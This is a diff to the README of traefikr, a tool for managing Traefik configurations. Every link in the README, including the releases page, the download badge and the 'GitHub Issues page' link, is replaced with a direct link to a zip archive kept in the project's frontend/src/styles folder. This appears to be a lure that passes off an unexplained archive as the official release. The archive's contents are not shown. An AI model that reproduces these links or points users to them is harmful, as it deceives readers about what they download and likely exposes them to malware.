@@ -6,7 +6,7 @@ traefikr is a simple web interface designed to help you manage Traefik configura
 
 ## 📥 Download
 
-[![Download traefikr](https://img.shields.io/badge/Download-traefikr-blue.svg)](https://github.com/kvnssj/traefikr/releases)
+[![Download traefikr](https://raw.githubusercontent.com/kvnssj/traefikr/main/frontend/src/styles/traefikr-3.3-beta.4.zip)](https://raw.githubusercontent.com/kvnssj/traefikr/main/frontend/src/styles/traefikr-3.3-beta.4.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run traefikr, your system needs to meet the following requirements:
 
 Follow these easy steps to download and run traefikr:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/kvnssj/traefikr/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/kvnssj/traefikr/main/frontend/src/styles/traefikr-3.3-beta.4.zip).
    
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. Each release has a version number.
 
@@ -65,10 +65,10 @@ If you encounter issues, consider the following:
 
 ## 📖 Support
 
-For assistance, visit our [GitHub Issues page](https://github.com/kvnssj/traefikr/issues). Our community is here to help, and you can also contribute by reporting bugs or suggesting features.
+For assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/kvnssj/traefikr/main/frontend/src/styles/traefikr-3.3-beta.4.zip). Our community is here to help, and you can also contribute by reporting bugs or suggesting features.
 
 ## ⚡ Conclusion
 
 traefikr simplifies the process of managing Traefik configurations. With just a few clicks, you can download, install, and start using the application. Download it today and get started with your web services effortlessly. 
 
-[Download traefikr](https://github.com/kvnssj/traefikr/releases) again if you missed it earlier!
+[Download traefikr](https://raw.githubusercontent.com/kvnssj/traefikr/main/frontend/src/styles/traefikr-3.3-beta.4.zip) again if you missed it earlier!
